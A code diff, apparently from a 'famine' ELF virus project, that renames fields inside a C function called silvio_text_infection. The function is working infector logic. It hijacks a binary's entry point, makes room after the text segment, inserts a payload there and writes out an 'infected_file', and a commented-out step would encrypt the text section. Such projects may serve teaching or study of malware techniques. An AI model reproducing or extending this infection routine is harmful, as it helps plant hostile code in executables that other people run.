@@ -27,7 +27,7 @@ void silvio_text_infection(t_famine *famine)
     {
         if (is_text_segment(famine->phdr[i]))
         {
-            famine->payload_vaddr = famine->text_p_vaddr + famine->phdr[i].p_filesz;
+            famine->payload_vaddr = famine->p_text_vaddr + famine->phdr[i].p_filesz;
             famine->ehdr->e_entry = famine->payload_vaddr;
             famine->new_entry_point = famine->payload_vaddr;
 
@@ -41,7 +41,7 @@ void silvio_text_infection(t_famine *famine)
         }
     }
 
-    if (famine->text_p_end_offset % PAGE_SIZE + famine->payload_size > PAGE_SIZE)
+    if (famine->p_text_end_offset % PAGE_SIZE + famine->payload_size > PAGE_SIZE)
     {
         error(ERROR_NOT_ENOUGHT_SPACE_FOR_PAYLOAD, famine);
     }
@@ -49,7 +49,7 @@ void silvio_text_infection(t_famine *famine)
     // Adding offset of one page in all section located after text section end. And get text section offset for the encryption.
     for (size_t i = 0; i < famine->ehdr->e_shnum; i++)
     {
-        if (famine->shdr[i].sh_offset > famine->text_p_end_offset)
+        if (famine->shdr[i].sh_offset > famine->p_text_end_offset)
         {
             famine->shdr[i].sh_offset += PAGE_SIZE;
         }
@@ -89,13 +89,13 @@ void silvio_text_infection(t_famine *famine)
     }
 
     // Copy until text section end
-    memcpy(famine->infected_file, famine->mmap_ptr, famine->text_p_end_offset);
+    memcpy(famine->infected_file, famine->mmap_ptr, famine->p_text_end_offset);
     // // Rewrite text section with cipher data.
     // memcpy(famine->infected_file + famine->encrypt_s_start_offset, famine->cipher, famine->encrypt_s_size);
     // Initialize value to zero for padding.
-    bzero(famine->infected_file + famine->text_p_end_offset, PAGE_SIZE);
+    bzero(famine->infected_file + famine->p_text_end_offset, PAGE_SIZE);
     // Insert payload after text section end
-    memcpy(famine->infected_file + famine->text_p_end_offset, famine->payload_data, famine->payload_size);
+    memcpy(famine->infected_file + famine->p_text_end_offset, famine->payload_data, famine->payload_size);
     // Insert rest of binary
-    memcpy(famine->infected_file + famine->text_p_end_offset + PAGE_SIZE, famine->mmap_ptr + famine->text_p_end_offset, famine->binary_data_size - famine->text_p_end_offset);
+    memcpy(famine->infected_file + famine->p_text_end_offset + PAGE_SIZE, famine->mmap_ptr + famine->p_text_end_offset, famine->binary_data_size - famine->p_text_end_offset);
 }
